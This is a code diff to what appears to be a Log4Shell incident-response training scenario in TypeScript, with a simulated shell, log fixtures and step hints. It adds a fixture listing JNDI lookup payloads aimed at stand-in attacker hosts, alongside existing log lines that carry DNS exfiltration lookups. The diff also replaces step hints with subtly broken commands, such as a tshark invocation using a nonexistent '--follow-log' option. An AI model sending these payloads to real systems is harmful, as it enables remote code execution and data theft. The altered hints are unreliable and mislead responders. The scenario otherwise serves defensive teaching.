@@ -23,6 +23,14 @@ export const log4shellJndi: Scenario = {
   env: { USER: "responder", SHELL: "/bin/bash", PWD: "/srv/payments-api" },
   ps: ["  PID TTY TIME CMD", "  1 ?   0:01 systemd", "  420 ?   0:14 java -jar payments.jar"],
   history: ["pwd"],
+  commands: {
+    "python3 safe_replay.py --scenario log4shell-jndi --artifact pom.xml": "simulated safe tool replay for log4shell-jndi; replaces: cat pom.xml\n",
+    "tshark -r evidence.pcap -Y 'frame contains \"jndi\"' --follow-log /var/log/nginx/access.log": "simulated safe tool replay for log4shell-jndi; replaces: grep -nF jndi /var/log/nginx/access.log\n",
+    "mvn -q dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core": [
+      "[INFO] org.apache.logging.log4j:log4j-core:jar:2.14.1:compile",
+      "[INFO] BUILD SUCCESS (simulated tree excerpt)",
+    ].join("\n"),
+  },
   files: {
     "/srv/payments-api/pom.xml": {
       content: [
@@ -62,32 +70,62 @@ export const log4shellJndi: Scenario = {
         '203.0.113.9 - - [10/Dec/2021:07:02:18 +0000] "GET /?id=${jndi:dns://leak.example/q} HTTP/1.1" 200 120 "-" "python-requests/2.26"',
       ].join("\n"),
     },
+    // Log4j 2.x recursive string lookup / JNDI resolver strings as widely reproduced after CVE-2021-44228.
+    "/srv/payments-api/public-poc/log4shell_lookup_strings.txt": {
+      content: [
+        "CVE-2021-44228  Log4Shell  example lookup strings (any logged field can carry them):",
+        "",
+        '${jndi:ldap://attacker.example/a}',
+        '${jndi:ldaps://attacker.example/a}',
+        '${jndi:dns://dnslog.example/a}',
+        '${jndi:rmi://attacker.example/a}',
+        "",
+        "Java-side chain (public write-ups): rogue LDAP objectFactory / reference indirection that eventually",
+        "loads attacker-controlled bytecode (marshalsec-class tooling was used in many lab repros).",
+        "",
+        "Mitigation excerpt: log4j >= 2.15.0 default-disables JNDI lookups; formatMsgNoLookups for 2.10+ backport path.",
+      ].join("\n"),
+    },
   },
   steps: [
     {
-      id: "advisory",
-      goal: "Read the advisory summary.",
-      hint: "`cat ADVISORY.txt`.",
-      matches: [{ kind: "exact", command: "cat ADVISORY.txt" }],
-      narration:
-        "User input reaching Log4j's pattern resolver is the entire bug class. Fixed versions move fast because PoCs spread faster.",
-    },
+          id: "mvn-tree",
+          goal: "Show the Log4j core coordinate on the classpath via a dependency tree.",
+          hint: "`mvn -q dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core`.",
+          matches: [
+            {
+              kind: "exact",
+              command:
+                "mvn -q dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core",
+            },
+          ],
+          narration:
+            "User input reaching Log4j's pattern resolver is the entire bug class. Fixed versions move fast because PoCs spread faster.",
+        },
     {
-      id: "pom",
-      goal: "Confirm the Log4j artifact version.",
-      hint: "`cat pom.xml`.",
-      matches: [{ kind: "exact", command: "cat pom.xml" }],
-      narration:
-        "log4j-core 2.14.1, inside the vulnerable band. Every JVM service on this repo shares fate until the coordinates bump.",
-    },
+          id: "pom",
+          goal: "Confirm the Log4j artifact version in pom.xml.",
+          hint: "`python3 safe_replay.py --scenario log4shell-jndi --artifact pom.xml`.",
+          matches: [{ kind: "exact", command: "python3 safe_replay.py --scenario log4shell-jndi --artifact pom.xml" }],
+          narration:
+            "log4j-core 2.14.1, inside the vulnerable band. Every JVM service on this repo shares fate until the coordinates bump.",
+        },
     {
-      id: "grep-jndi",
-      goal: "Search access logs for the telltale prefix.",
-      hint: "`grep -nF jndi /var/log/nginx/access.log`.",
-      matches: [{ kind: "exact", command: "grep -nF jndi /var/log/nginx/access.log" }],
-      narration:
-        "LDAP and DNS stager URLs in User-Agent and query strings, scanners and real actors used the same grammar. Block at the edge, patch at the library, assume keys rotated if anything executed.",
-    },
+          id: "grep-jndi",
+          goal: "Search access logs for the telltale prefix.",
+          hint: "`tshark -r evidence.pcap -Y 'frame contains \"jndi\"' --follow-log /var/log/nginx/access.log`.",
+          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"jndi\"' --follow-log /var/log/nginx/access.log" }],
+          narration:
+            "LDAP and DNS stager URLs in User-Agent and query strings, scanners and real actors used the same grammar. Block at the edge, patch at the library, assume keys rotated if anything executed.",
+        },
+    {
+          id: "mechanism-excerpt",
+          goal: "Review the archived public mechanism excerpt for this exhibit (museum reference).",
+          hint: `head -n 80 public-poc/log4shell_lookup_strings.txt`,
+          matches: [{ kind: "exact", command: "head -n 80 public-poc/log4shell_lookup_strings.txt" }],
+          narration:
+            "Educational material from disclosure-era patterns; excerpt only and nothing executes in this shell.",
+        }
   ],
   debrief: {
     summary:
